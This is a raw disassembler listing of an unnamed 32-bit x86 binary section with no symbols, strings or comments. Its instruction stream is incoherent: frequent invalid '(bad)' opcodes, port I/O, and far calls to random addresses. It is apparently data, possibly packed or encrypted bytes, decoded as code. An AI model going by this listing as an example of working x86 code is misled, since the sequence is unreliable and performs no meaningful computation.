  414967:	sahf   
  414968:	inc    ecx
  414969:	mul    DWORD PTR [edi+ecx*2-0x25e5cba8]
  414970:	shl    bl,cl
  414972:	imul   ecx,DWORD PTR [esi],0x3a
  414975:	in     al,0x8b
  414977:	ret    0xb86f
  41497a:	adc    al,0xfc
  41497c:	pushf  
  41497d:	add    esp,DWORD PTR [esi+ebp*4]
  414980:	ficom  DWORD PTR [ebx+0x9]
  414983:	xor    esi,DWORD PTR [edi]
  414985:	xchg   ebp,eax
  414986:	(bad)  
  414987:	push   edx
  414988:	out    dx,eax
  414989:	clc    
  41498a:	mov    ebp,0x4f46589d
  41498f:	mov    dl,0x1b
  414991:	push   esp
  414992:	ret    0x584f
  414995:	sub    eax,0x3855bca
  41499a:	test   BYTE PTR [ebp+0x18a94993],al
  4149a0:	call   0xb1309d30
  4149a5:	jmp    0x89677f73
  4149aa:	cld    
  4149ab:	pop    ecx
  4149ac:	lea    eax,[ebp+edi*1+0x3]
  4149b0:	xchg   ecx,eax
  4149b1:	(bad)  
  4149b2:	call   0x74d3:0x5e3b10fb
  4149b9:	(bad)  
  4149ba:	push   esp
  4149bb:	or     al,0xd0
  4149bd:	xchg   ecx,eax
  4149be:	or     al,0x4c
  4149c0:	mov    DWORD PTR [eax+ecx*1+0x405ebcc1],0x603d21f3
  4149cb:	mov    eax,ds:0x38360ea9
  4149d0:	mov    al,0x35
  4149d2:	push   es
  4149d3:	stc    
  4149d4:	lea    esi,[edi+0x4d]
  4149d7:	xchg   ebx,eax
  4149d8:	dec    edx
  4149d9:	lds    esp,FWORD PTR [ecx+0x1fc501ff]
  4149df:	(bad)  
  4149e0:	ja     0x414a37
  4149e2:	cmp    DWORD PTR [eax-0x5b51f697],eax
  4149e8:	add    DWORD PTR [eax],edi
  4149ea:	test   DWORD PTR [ebx-0x71],ecx
  4149ed:	(bad)  
  4149ee:	sbb    DWORD PTR [ebx-0x13c850ab],edi
  4149f4:	xchg   esi,eax
  4149f5:	out    dx,eax
  4149f6:	out    dx,al
  4149f7:	mov    ah,0xd9
  4149f9:	adc    bl,BYTE PTR [edi+0x19]
  4149fc:	cmp    al,0x2
  4149fe:	ret    0x4e96
  414a01:	xor    al,0xab
  414a03:	and    al,0x90
  414a05:	mov    bh,0x39
  414a07:	ret    0x5be1
  414a0a:	popf   
  414a0b:	(bad)  
  414a0c:	(bad)  
  414a0d:	push   ss
  414a0e:	out    dx,eax
  414a0f:	aaa    
  414a10:	jmp    0xfbb9c41a
  414a15:	imul   cl
  414a17:	inc    esp
  414a18:	dec    edi
  414a19:	ret    0x5a62
  414a1c:	enter  0x9a6,0xb6
  414a20:	in     al,dx
  414a21:	imul   eax,DWORD PTR [eax-0x7982ec5f],0xffffff9c
  414a28:	sub    eax,ebx
  414a2a:	daa    
  414a2b:	or     ebp,edx
  414a2d:	cmp    DWORD PTR [edi-0x16],esi
  414a30:	imul   BYTE PTR [ebx+0x75]
  414a33:	mov    bl,0xb2
  414a35:	addr16 (bad) 
  414a38:	dec    ebp
  414a39:	sahf   
  414a3a:	call   0xdcab:0x3dd09e92
  414a41:	dec    eax
  414a42:	shl    DWORD PTR [edi+0x2b4ab926],cl
  414a48:	mov    edi,0x908779ef
  414a4d:	xchg   ebp,eax
  414a4e:	add    bh,BYTE PTR [edx-0x14]
  414a51:	nop
  414a52:	inc    ebx
  414a53:	jl     0x414ad3
  414a55:	jmp    0x1c07:0x6a837d79
  414a5c:	jae    0x414a9c
  414a5e:	jecxz  0x4149f7
  414a60:	cmp    DWORD PTR [esi+ecx*4-0x4a],esi
  414a64:	fidivr DWORD PTR [esi-0x48b5020a]
  414a6a:	sbb    DWORD PTR [ebx-0xbecb36e],edx
  414a70:	pusha  
  414a71:	movhlps xmm4,xmm5
  414a74:	sbb    bl,BYTE PTR [eax-0x4b]
  414a77:	ret    0x52b4
  414a7a:	push   cs
  414a7b:	cmp    al,0xb0
  414a7d:	mov    esp,0x1d218bcd
  414a82:	sbb    DWORD PTR [ecx-0x63dc9ac2],eax
  414a88:	cld    
  414a89:	cmp    ch,ah
  414a8b:	push   esp
  414a8c:	sbb    edx,DWORD PTR [esi]
  414a8e:	jnp    0x414ad0
  414a90:	daa    
  414a91:	jnp    0x414a91
  414a93:	mov    ds:0x69c6f7c4,eax
  414a98:	or     eax,0x61ddd1f
  414a9d:	call   0x9de5ace9
  414aa2:	xlat   BYTE PTR ds:[ebx]
  414aa3:	pushaw 
  414aa5:	mov    al,ds:0x94945320
  414aaa:	outs   dx,DWORD PTR ds:[esi]
  414aab:	je     0x414b00
  414aad:	fisub  DWORD PTR [ebp-0x74760b7e]
  414ab3:	sub    edi,esp
  414ab5:	cmp    eax,0x9f537535
  414aba:	sti    
  414abb:	inc    edx
  414abc:	rcl    DWORD PTR [ebp+0x52],cl
  414abf:	(bad)  
  414ac0:	push   esi
  414ac1:	mov    eax,ds:0x5e236376
  414ac6:	sbb    al,0x9a
  414ac8:	inc    ecx
  414ac9:	inc    ecx
  414aca:	adc    eax,0x64e7a59c
  414acf:	rcl    DWORD PTR [ebx+0x3d],1
  414ad2:	ror    DWORD PTR [eax+0xbe256b3],0x47
  414ad9:	pop    edx
  414ada:	sahf   
  414adb:	mov    esp,0xaf7a686c
  414ae0:	sbb    BYTE PTR [edi+0x2488a91f],ch
  414ae6:	jmp    0x28c0:0x70d6d817
  414aed:	sub    eax,DWORD PTR [edi-0x761b49c7]
  414af3:	inc    esi
  414af4:	xchg   ecx,eax
  414af5:	je     0x414b24
  414af7:	and    DWORD PTR [eax+0x34],esp
  414afa:	fidiv  DWORD PTR [edi]
  414afc:	mov    WORD PTR [ecx-0x58],?
  414aff:	pop    ss
  414b00:	add    BYTE PTR [esi],bl
  414b02:	jg     0x414b13
  414b04:	fist   DWORD PTR [ecx-0x64c4e775]
  414b0a:	adc    dl,BYTE PTR [esi-0x48]
  414b0d:	mov    ah,0xed
  414b0f:	sub    ah,BYTE PTR [edx+0x7df2dd13]
  414b15:	xchg   BYTE PTR [esi-0x5f07342d],cl
  414b1b:	add    eax,0xb143c1c8
  414b20:	push   ss
  414b21:	push   eax
  414b22:	pop    edx
  414b23:	dec    ebx
  414b24:	or     eax,0x552d892c
  414b29:	or     ebx,DWORD PTR [edi]
  414b2b:	test   eax,0xfc4a1670
  414b30:	clc    
  414b31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b32:	(bad)  
  414b33:	fld    QWORD PTR [edx-0x74]
  414b36:	cmp    DWORD PTR [edx-0x2b],ebp
  414b39:	mov    al,0x6b
  414b3b:	inc    ecx
  414b3c:	dec    ecx
  414b3d:	push   0xffffffcd
  414b3f:	inc    esp
  414b40:	shl    DWORD PTR [bx],1
  414b43:	(bad)  
  414b44:	mov    al,BYTE PTR [ebp+0x1]
  414b47:	jge    0x414b16
  414b49:	jns    0x414b45
  414b4b:	aaa    
  414b4c:	les    edi,FWORD PTR [ecx]
  414b4e:	xlat   BYTE PTR ds:[ebx]
  414b4f:	push   edx
  414b50:	and    DWORD PTR [edi],ebp
  414b52:	xor    esp,DWORD PTR fs:[edi]
  414b55:	mov    WORD PTR [ecx+0x7f],gs
  414b58:	mov    BYTE PTR [ebp+0x79bacf40],dh
  414b5e:	xor    eax,0xa0011bb4
  414b63:	stos   BYTE PTR es:[edi],al
  414b64:	pop    ds
  414b65:	mov    edi,0xd0aebaef
  414b6a:	xchg   ebx,eax
  414b6b:	out    dx,al
  414b6c:	xchg   ecx,eax
  414b6d:	not    BYTE PTR [eax-0x5b03873]
  414b73:	mov    eax,0x992459b0
  414b78:	adc    eax,0xd6769d34
  414b7d:	jno    0x414bc1
  414b7f:	xchg   ebp,eax
  414b80:	cmp    esi,DWORD PTR [ecx+0x6469f8a1]
  414b86:	jg     0x414be7
  414b88:	mov    ch,0x95
  414b8a:	and    ah,ch
  414b8c:	mov    esp,0x1e6197d5
  414b91:	rcr    esi,cl
  414b93:	fstp   st(0)
  414b95:	cmp    DWORD PTR [esi+0x2],esi
  414b98:	loopne 0x414b35
  414b9a:	adc    al,0xc6
  414b9c:	xor    bl,cl
  414b9e:	sti    
  414b9f:	arpl   WORD PTR [ebp+0x444983ce],bp
  414ba5:	mov    WORD PTR [ecx-0x32113f9d],ds
  414bab:	jae    0x414bfb
  414bad:	iret   
  414bae:	mov    ah,0x97
  414bb0:	iret   
  414bb1:	add    eax,0x4a3983ad
  414bb6:	inc    eax
  414bb7:	enter  0xfdfa,0xe2
  414bbb:	or     ebx,ecx
  414bbd:	ja     0x414b46
  414bbf:	ror    ebp,0xa5
  414bc2:	pop    ebp
  414bc3:	imul   ecx,DWORD PTR [edi-0x5c],0xecfaa3a6
  414bca:	ror    BYTE PTR [ebx],cl
  414bcc:	popa   
  414bcd:	ins    DWORD PTR es:[edi],dx
  414bce:	les    edi,FWORD PTR [edi+0x29]
  414bd1:	lods   eax,DWORD PTR ds:[esi]
  414bd2:	pop    ecx
  414bd3:	out    dx,eax
  414bd4:	stos   BYTE PTR es:[edi],al
  414bd5:	mov    ds:0xaff087b1,eax
  414bda:	pop    es
  414bdb:	push   ss
  414bdc:	inc    esp
  414bdd:	ret    0xe31
  414be0:	test   al,0x1d
  414be2:	rcl    ebp,0xc8
  414be5:	mov    ah,0xe2
  414be7:	mov    edx,0xf66981a7
  414bec:	jno    0x414bac
  414bee:	imul   edi,DWORD PTR [edi-0x7c],0x195fdd3c
  414bf5:	jne    0x414ba1
  414bf7:	adc    BYTE PTR [edx+0x4b],0xb
  414bfb:	push   ecx
  414bfc:	inc    edi
  414bfd:	scas   al,BYTE PTR es:[edi]
  414bfe:	test   DWORD PTR [edx-0x638fd1d4],0x501a4c8a
  414c08:	jle    0x414c56
  414c0a:	bound  edi,QWORD PTR [edx]
  414c0c:	enter  0x92c9,0xa
  414c10:	mov    ecx,0x502a9c6c
  414c15:	inc    edx
  414c16:	je     0x414c56
  414c18:	cmp    cl,BYTE PTR [eax-0x7e737eb3]
  414c1e:	out    0x2a,al
  414c20:	add    eax,0x9aac7def
  414c25:	call   0x1d37:0x2240888
  414c2c:	xor    eax,0x380127f0
  414c31:	or     al,0x10
  414c33:	pop    edi
  414c34:	mov    eax,ds:0xc490c145
  414c39:	lock shr BYTE PTR [eax-0x4b463727],0xe7
  414c41:	stos   BYTE PTR es:[edi],al
  414c42:	adc    eax,0x622437b
  414c47:	xchg   BYTE PTR [ebx+0xeb442c4],bh
  414c4d:	addr16 jl 0x414c60
  414c50:	mov    ah,0x29
  414c52:	fstp   TBYTE PTR [esi+eax*8]
  414c55:	pop    ebx
  414c56:	mov    dl,0xe4
  414c58:	inc    edx
  414c59:	xchg   edx,eax
  414c5a:	and    eax,0x529f7b47
  414c5f:	mov    ebx,db3
  414c62:	arpl   WORD PTR [esi],cx
  414c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c65:	popf   
  414c66:	and    DWORD PTR [ecx],0xdc723665
  414c6c:	inc    ecx
  414c6d:	mov    ds:0x1338b958,eax
  414c73:	pushf  
  414c74:	ja     0x414c96
  414c76:	das    
  414c77:	ins    BYTE PTR es:[edi],dx
  414c78:	js     0x414c99
  414c7a:	int3   
  414c7b:	mov    DWORD PTR ss:[edi+0x2f57903d],0xe7557d7f
  414c86:	sbb    al,0x4c
  414c88:	ret    0x1648
  414c8b:	int3   
  414c8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c8d:	cmp    esi,DWORD PTR [ebp+0x5c]
  414c90:	fidivr WORD PTR [edx-0x7f]
  414c93:	outs   dx,DWORD PTR ds:[esi]
  414c94:	in     al,0x89
  414c96:	push   ebx
  414c97:	mov    dh,BYTE PTR [eax]
  414c99:	fst    st(3)
  414c9b:	push   esi
  414c9c:	adc    ecx,DWORD PTR [ebx+0x63]
  414c9f:	and    DWORD PTR [ebx],ecx
  414ca1:	in     al,dx
  414ca2:	mov    al,ds:0xadc3766b
  414ca7:	stos   DWORD PTR es:[edi],eax
  414ca8:	mov    al,0x2e
  414caa:	ja     0x414cb0
  414cac:	aam    0x48
  414cae:	stc    
  414caf:	inc    esp
  414cb0:	mov    dh,0x98
  414cb2:	call   0x971bbbb0
  414cb7:	dec    edi
  414cb8:	pop    es
  414cb9:	mov    ecx,0xf9f8b175
  414cbe:	push   edx
  414cbf:	xor    DWORD PTR ds:0x7bc956e7,edx
  414cc5:	(bad)
  414cc8:	aas    
  414cc9:	imul   ebx,DWORD PTR [ebx],0x53
  414ccc:	push   es
  414ccd:	push   es
  414cce:	mov    ecx,ebp
  414cd0:	imul   eax,DWORD PTR [ecx],0x76
  414cd3:	ret    0xaef1
  414cd6:	add    al,0x72
  414cd8:	fs jb  0x414d12
  414cdb:	div    DWORD PTR [esi+0x67]
  414cde:	call   0xc338:0x11ce1e92
  414ce5:	jb     0x414cae
  414ce7:	lods   al,BYTE PTR ds:[esi]
  414ce8:	cmp    eax,0xbd66123c
  414ced:	jns    0x414d59
  414cef:	mov    cl,0xea
  414cf1:	test   BYTE PTR [ebx-0x1f60728e],0x98
  414cf8:	push   ss
  414cf9:	fisubr WORD PTR [ecx]
  414cfb:	inc    edi
  414cfc:	xchg   ebp,eax
  414cfd:	jge    0x414d48
  414cff:	pop    ecx
  414d00:	and    DWORD PTR [esi+ebp*1],esp
  414d03:	jl     0x414d23
  414d05:	xchg   BYTE PTR [esi-0x6b],bh
  414d08:	fsub   DWORD PTR [eax+edi*4-0x21a4d332]
  414d0f:	icebp  
  414d10:	or     bh,bl
  414d12:	inc    edx
  414d13:	jb     0x414d5e
  414d15:	inc    BYTE PTR [ebx+0x18]
  414d18:	dec    ebp
  414d19:	inc    edi
  414d1a:	jns    0x414d62
  414d1c:	call   0x80fc96eb
  414d21:	and    DWORD PTR [ecx],ecx
  414d23:	cdq    
  414d24:	dec    ebx
  414d25:	mov    ds:0x111a7eee,al
  414d2a:	push   es
  414d2b:	iret   
  414d2c:	call   0xbf84:0xde6d26a2
  414d33:	popf   
  414d34:	ins    DWORD PTR es:[edi],dx
  414d35:	in     al,0x33
  414d37:	lds    esp,FWORD PTR [edx+ebx*2+0x17c5dfbd]
  414d3e:	div    DWORD PTR [esi]
  414d40:	(bad)  
  414d42:	mov    ebp,esi
  414d44:	fisubr WORD PTR [esp+edi*2+0x2f]
  414d48:	mov    al,ds:0xfa402a03
  414d4d:	hlt    
  414d4e:	mov    ds:0x6e38e452,al
  414d53:	jne    0x414db9
  414d55:	repz jl 0x414dd0
  414d58:	push   es
  414d59:	mov    cl,0x53
  414d5b:	push   ds
  414d5c:	inc    edx
  414d5d:	push   ss
  414d5e:	addr16 loope 0x414d47
  414d61:	shl    DWORD PTR [edi],1
  414d63:	test   al,0xad
  414d65:	xor    al,0xd7
  414d67:	cmc    
  414d68:	pop    ebx
  414d69:	xchg   ebx,eax
  414d6a:	test   esp,0x12ab350a
  414d70:	jge    0x414d88
  414d72:	xor    bl,ah
  414d74:	sbb    ebp,ecx
  414d76:	pop    edx
  414d77:	xchg   edi,eax
  414d78:	push   edi
  414d79:	pushf  
  414d7a:	(bad)  
  414d7b:	(bad)  
  414d7c:	pop    ecx
  414d7d:	dec    ecx
  414d7e:	sbb    eax,ebx
  414d80:	jae    0x414da8
  414d82:	in     al,dx
  414d83:	and    al,0xea
  414d85:	mov    DWORD PTR [edi-0x2e],ebp
  414d88:	fild   DWORD PTR [ecx-0x33ac557e]
  414d8e:	dec    esp
  414d8f:	mov    ds,WORD PTR [ecx-0x38]
  414d92:	mov    WORD PTR [ebp-0x69b5f581],ds
  414d98:	fidivr WORD PTR [ecx+0x773ceda8]
  414d9e:	packsswb mm7,QWORD PTR [esi-0x483244ed]
  414da5:	fs scas al,BYTE PTR es:[edi]
  414da7:	mov    al,ds:0x17420bb4
  414dac:	stc    
  414dad:	fbld   TBYTE PTR [ecx]
  414daf:	pushf  
  414db0:	(bad)  
  414db1:	rcr    DWORD PTR [esi+0x6135c04b],cl
  414db7:	dec    esp
  414db8:	inc    ecx
  414db9:	jns    0x414dc2
  414dbb:	xor    eax,0xf6f40943
  414dc0:	test   DWORD PTR ds:0xe3a709e0,ebx
  414dc6:	push   edi
  414dc7:	ficomp DWORD PTR [edi+0x69bfb590]
  414dcd:	call   0x689825ca
  414dd2:	popa   
  414dd3:	imul   ebx,DWORD PTR [eax-0x5a],0x1c287a4b
  414dda:	idiv   DWORD PTR [edx+0x5d42fa39]
  414de0:	rol    DWORD PTR [edx],cl
  414de2:	dec    edx
  414de3:	in     al,0xf3
  414de5:	cwde   
  414de6:	arpl   WORD PTR [edx+ebp*2],dx
  414de9:	das    
  414dea:	ror    DWORD PTR [ecx+0x73723e1f],cl
  414df0:	add    al,0x4d
  414df2:	stc    
  414df3:	inc    ecx
  414df4:	out    dx,al
  414df5:	adc    ebp,DWORD PTR [esi+0x3a]
  414df8:	jne    0x414e1f
  414dfa:	test   eax,0x3785f1c7
  414dff:	outs   dx,BYTE PTR ds:[esi]
  414e00:	sbb    DWORD PTR [edi+eax*8+0x2b],0xab772b6a
  414e08:	idiv   DWORD PTR [ecx+0x24]
  414e0b:	pop    ds
  414e0c:	mov    esp,0x7e24be94
  414e11:	push   cs
  414e12:	in     al,0x1c
  414e14:	fisub  WORD PTR [ecx-0x34709a6f]
  414e1a:	int3   
  414e1b:	in     al,0xc8
  414e1d:	mov    edx,0xe0be1ccd
  414e22:	fs out 0xd6,al
  414e25:	aas    
  414e26:	popa   
  414e27:	idiv   DWORD PTR [ebx+ebp*4-0x57]
  414e2b:	shl    DWORD PTR ds:0x4360f77a,cl
  414e31:	push   edx
  414e32:	mov    al,0x2a
  414e34:	xchg   esp,eax
  414e35:	inc    ecx
  414e36:	mov    dh,0xf9
  414e38:	pop    eax
  414e39:	in     al,dx
  414e3a:	jno    0x414e6e
  414e3c:	adc    eax,0x90d21e03
  414e41:	sbb    ax,0x8304
  414e45:	sbb    eax,0x9393b173
  414e4a:	dec    ebp
  414e4b:	or     edx,DWORD PTR [esi]
  414e4d:	jecxz  0x414ecd
  414e4f:	sub    al,0xca
  414e51:	mov    ds:0xbc4bb526,eax
  414e56:	add    eax,0xa7d34377
  414e5b:	loop   0x414e00
  414e5d:	fwait
  414e5e:	or     DWORD PTR [esi-0x53],0xa6785776
  414e65:	shl    DWORD PTR [ecx+eax*1-0x68996a1],cl
  414e6c:	jns    0x414ec2
  414e6e:	int3   
  414e6f:	pusha  
  414e70:	push   ebp
  414e71:	(bad)  
  414e72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e73:	dec    esp
  414e74:	pop    esi
  414e75:	push   edi
  414e76:	ss sbb edx,eax
  414e79:	(bad)  
  414e7a:	jg     0x414ede
  414e7c:	jp     0x414e1a
  414e7e:	xor    ecx,ebx
  414e80:	cmp    DWORD PTR [edx-0x6e],ecx
  414e83:	push   ebx
  414e84:	jmp    0x96a31ba9
  414e89:	xor    eax,0xf177fb37
  414e8e:	inc    edx
  414e8f:	test   al,0xe4
  414e91:	sub    al,0x59
  414e93:	fsubr  DWORD PTR [ecx+0x5ed1fd60]
  414e99:	fadd   DWORD PTR [ecx+edi*8]
  414e9c:	or     esi,eax
  414e9e:	add    esp,DWORD PTR [ebx-0x303844d0]
  414ea4:	lock mov al,0xcb
  414ea7:	nop
  414ea8:	mov    DWORD PTR ds:0xaccd7b74,edx
  414eae:	adc    eax,0x94f26290
  414eb3:	sti    
  414eb4:	dec    ebx
  414eb5:	xchg   DWORD PTR [eax],esp
  414eb7:	pop    ds
  414eb8:	pop    ss
  414eb9:	bsf    ebx,DWORD PTR [ecx]
  414ebc:	dec    esp
  414ebd:	les    edx,FWORD PTR [esi-0x78854c58]
  414ec3:	fidivr WORD PTR [edi-0x1b]
  414ec6:	lock mov DWORD PTR [edi],esp
  414ec9:	xor    BYTE PTR [edx+edx*4],ch
  414ecc:	fst    st(6)
  414ece:	in     al,0xa
  414ed0:	add    ch,BYTE PTR [eax+ebx*8-0x1d]
  414ed4:	(bad)  
  414ed5:	lock dec DWORD PTR [ebp+0x162ace8a]
  414edc:	xchg   ebp,eax
  414edd:	add    DWORD PTR [edx-0x61],0xf07f25f7
  414ee4:	ja     0x414ef1
  414ee6:	inc    ecx
  414ee7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ee9:	xchg   edi,eax
  414eea:	das    
  414eeb:	fmul   DWORD PTR [eax]
  414eed:	sti    
  414eee:	les    esi,FWORD PTR [ebp+0x67]
  414ef1:	mov    ch,0x60
  414ef3:	(bad)  
  414ef4:	test   BYTE PTR ss:[ecx-0x23],dl
  414ef8:	aaa    
  414ef9:	xor    bx,si
  414efc:	sbb    esp,0x9
  414eff:	dec    BYTE PTR [esi+0x3b7c895b]
  414f05:	xor    eax,0x7f9cd7bd
  414f0a:	cs or  si,si
  414f0e:	mov    edi,0xafb50532
  414f13:	mov    bl,0x1
  414f15:	fs sbb eax,0x12a96404
  414f1b:	repnz inc si
  414f1e:	mov    dl,0x4e
  414f20:	imul   ebp,DWORD PTR [ebx+0x65aa130e],0xffffffee
  414f27:	sbb    ecx,DWORD PTR [ebx-0x5a]
  414f2a:	bound  esi,QWORD PTR [edx]
  414f2c:	int    0x28
  414f2e:	cmp    eax,0xfe244eb9
  414f33:	xor    dh,BYTE PTR [eax+0x7e]
  414f36:	jo     0x414f15
  414f38:	mov    eax,0x7966f139
  414f3d:	loopne 0x414f98
  414f3f:	out    0x53,al
  414f41:	mov    ah,0xf2
  414f43:	cli    
  414f44:	sub    DWORD PTR [edi+0x6280ae99],ebx
  414f4a:	stc    
  414f4b:	aad    0x61
  414f4d:	imul   ebp,DWORD PTR [ebp-0x7a5603f0],0x68
  414f54:	out    0x14,eax
  414f56:	pop    ebp
  414f57:	mov    al,0x29
  414f59:	pop    eax
  414f5a:	out    0xa,al
  414f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f5d:	mov    ds:0x93c4fd77,al
  414f62:	jb     0x414eef
  414f64:	and    al,0x13
  414f66:	inc    ebx
  414f67:	add    DWORD PTR [edi+eiz*8],0xa44d98a1
  414f6e:	adc    al,0x2a
  414f70:	or     al,0x9d
  414f72:	cwde   
  414f73:	cmp    ah,bh
  414f75:	(bad)  
  414f76:	retf   
  414f77:	mov    bh,0xe6
  414f79:	stos   DWORD PTR es:[edi],eax
  414f7a:	push   edi
  414f7b:	mov    esp,0x9f6020fe
  414f80:	adc    eax,ecx
  414f82:	add    al,0x3e
  414f84:	adc    DWORD PTR [eax+0x38473e60],0xafec4cff
  414f8e:	out    0xc7,al
  414f90:	xor    cl,ah
  414f92:	(bad)  
  414f93:	mov    ah,0x42
  414f95:	push   esp
  414f96:	jno    0x414f8e
  414f98:	je     0x414f26
  414f9a:	out    dx,eax
  414f9b:	cmp    al,0x58
  414f9d:	cs or  bh,bh
  414fa0:	enter  0xfb3a,0x81
  414fa4:	mov    al,ds:0xa96029a2
  414fa9:	mov    eax,ds:0x3be3e08a
  414fae:	fld    DWORD PTR [edx-0x1d]
  414fb1:	or     eax,DWORD PTR [eax-0x7b81ebe2]
  414fb7:	hlt    
  414fb8:	mov    ebx,0xe1c4ecc7
  414fbd:	(bad)  
  414fbe:	loop   0x414f70
  414fc0:	sbb    edi,edx
  414fc2:	inc    edx
  414fc3:	and    esi,0xffffffe7
  414fc6:	pusha  
  414fc7:	in     al,dx
  414fc8:	xchg   esp,eax
  414fc9:	pop    ecx
  414fca:	stos   BYTE PTR es:[edi],al
  414fcb:	dec    esi
  414fcc:	xor    eax,0x5ee63557
  414fd1:	push   eax
  414fd2:	imul   eax,DWORD PTR [ebp-0x7514958e],0xffffffa7
  414fd9:	push   es
  414fda:	sahf   
  414fdb:	ins    BYTE PTR es:[edi],dx
  414fdc:	mov    al,ds:0x2a1448c0
  414fe1:	iret   
  414fe2:	out    dx,al
  414fe3:	ja     0x41503e
  414fe5:	xor    al,0x81
  414fe7:	int    0xd6
  414fe9:	xchg   esp,eax
  414fea:	out    0xe3,eax
  414fec:	mov    es,WORD PTR [esi]
  414fee:	aas    
  414fef:	in     eax,dx
  414ff0:	shl    DWORD PTR ds:0x5b327f77,1
  414ff6:	sbb    eax,0x2750a0dd
  414ffb:	bound  esi,QWORD PTR [ecx-0x408be632]
  415001:	pop    edx
  415002:	dec    ebx
  415003:	push   edi
  415004:	test   al,0x79
  415006:	int    0x3d
  415008:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415009:	cmp    bl,al
  41500b:	icebp  
  41500c:	loop   0x414ff1
  41500e:	scas   eax,DWORD PTR es:[edi]
  41500f:	outs   dx,DWORD PTR ds:[esi]
  415010:	in     al,0x80
  415012:	rol    BYTE PTR [edx-0xb],cl
  415015:	pop    ss
  415016:	mov    bh,0x55
  415018:	sub    dh,dl
  41501a:	je     0x414fad
  41501c:	shl    ah,cl
  41501e:	fwait
  41501f:	dec    edi
  415020:	mov    BYTE PTR [edi-0x2c4d23f1],dh
  415026:	std    
  415027:	ins    DWORD PTR es:[edi],dx
  415028:	jne    0x414fe2
  41502a:	pop    esi
  41502b:	push   ebx
  41502c:	pop    ss
  41502d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41502e:	push   edi
  41502f:	cmp    BYTE PTR [ebx],cl
  415031:	ret    0x38c
  415034:	xor    dl,BYTE PTR [eax+edi*8-0x45110959]
  41503b:	test   dl,ch
  41503d:	xor    al,0xa3
  41503f:	xchg   esp,eax
  415040:	ins    DWORD PTR es:[edi],dx
  415041:	and    bl,BYTE PTR [ebp+0x2f5bae7]
  415047:	aas    
  415048:	in     eax,dx
  415049:	mov    ebx,0x477e5af1
  41504e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41504f:	hlt    
  415050:	jp     0x4150cd
  415052:	dec    ebp
  415053:	xor    bh,BYTE PTR [eax+0x70]
  415056:	test   al,0xaf
  415058:	mov    DWORD PTR [ebx+0x9d9694d],ecx
  41505e:	repnz sub al,0xb4
  415061:	inc    eax
  415062:	sbb    al,0x91
  415064:	xchg   ebx,eax
  415065:	lock pop es
  415067:	(bad)  
  415068:	mov    BYTE PTR [ebx+0x33],dl
  41506b:	pop    ds
  41506c:	sbb    al,0x43
  41506e:	mov    esi,0xa9f5ad14
  415073:	jae    0x415043
  415075:	repz (bad) 
  415077:	in     eax,dx
  415078:	fs sub eax,0xaf485df3
  41507e:	fsubr  DWORD PTR [esi-0x4b]
  415081:	xchg   DWORD PTR [edi+0x8],ebp
  415084:	ss test ah,ch
  415087:	adc    eax,0xf9497ae7
  41508c:	and    al,0x46
  41508e:	mov    dh,0xf1
  415090:	sbb    eax,0x6ba3cc24
  415095:	xchg   ecx,eax
  415096:	mov    ebx,0x5adf574f
  41509b:	(bad)  
  41509c:	jl     0x415096
  41509e:	dec    ebx
  41509f:	std    
  4150a0:	mov    ebx,esp
  4150a2:	mov    cl,0x6d
  4150a4:	stos   BYTE PTR es:[edi],al
  4150a5:	out    0xf5,al
  4150a7:	iret   
  4150a8:	test   al,0x97
  4150aa:	(bad)  
  4150ab:	adc    al,0xa3
  4150ad:	adc    esi,DWORD PTR [edi+0x7f]
  4150b0:	out    0x63,eax
  4150b2:	xchg   edi,eax
  4150b3:	daa    
  4150b4:	outs   dx,BYTE PTR ds:[esi]
  4150b5:	lahf   
  4150b6:	mov    ebp,0x7b544950
  4150bb:	dec    edx
  4150bc:	pusha  
  4150bd:	mov    ds:0x76695902,al
  4150c2:	push   0x42
  4150c4:	push   cs
  4150c5:	out    0xf5,al
  4150c7:	pop    ebp
  4150c8:	and    ecx,DWORD PTR [edx+0x40d07a7]
  4150ce:	stos   BYTE PTR es:[edi],al
  4150cf:	outs   dx,BYTE PTR ds:[esi]
  4150d0:	test   BYTE PTR [eax+0x4d],bh
  4150d3:	fiadd  WORD PTR [edx]
  4150d5:	test   ebx,esp
  4150d7:	and    al,0x7f
  4150d9:	sub    ebx,DWORD PTR [eax]
  4150db:	sbb    BYTE PTR [ebp+0x25],0x4e
  4150df:	sub    eax,DWORD PTR [ecx+esi*4]
  4150e2:	push   ds
  4150e3:	fld    QWORD PTR ds:0x8694df08
  4150e9:	mov    edx,0x9d88aedc
  4150ee:	sbb    esp,ebp
  4150f0:	repnz dec ebp
  4150f2:	nop
  4150f3:	sbb    eax,0xf81b4c78
  4150f8:	cmp    BYTE PTR [ebx],bh
  4150fa:	mov    dh,0x4e
  4150fc:	push   ss
  4150fd:	pop    esi
  4150fe:	sub    al,0xce
  415100:	into   
  415101:	add    bh,BYTE PTR [ecx+0x40ab2a7d]
  415107:	inc    ebx
  415108:	rcl    DWORD PTR [ebp-0x22],1
  41510b:	pop    es
  41510c:	xchg   esp,eax
  41510d:	pop    es
  41510e:	dec    esp
  41510f:	sbb    ebx,DWORD PTR [esi+0x5d]
  415112:	scas   al,BYTE PTR es:[edi]
  415113:	pusha  
  415114:	mov    ah,0xc6
  415116:	jne    0x4150b3
  415118:	sub    cl,BYTE PTR [edi+ecx*1]
  41511b:	int    0xc7
  41511d:	push   0x46e03aaa
  415122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415123:	test   eax,0xe5036a49
  415128:	(bad)  [edx+0x1f]
  41512b:	(bad)  
  41512c:	repnz cli 
  41512e:	push   esp
  41512f:	data16 daa 
  415131:	or     eax,0x457ab3f1
  415136:	sbb    eax,0x94f42416
  41513b:	jmp    0x4393:0x15880cba
  415142:	sbb    al,0x51
  415144:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  415146:	(bad)  
  415148:	jnp    0x415111
  41514a:	ins    DWORD PTR es:[edi],dx
  41514b:	out    0x5b,eax
  41514d:	sbb    ebp,DWORD PTR ds:0xe7efae7a
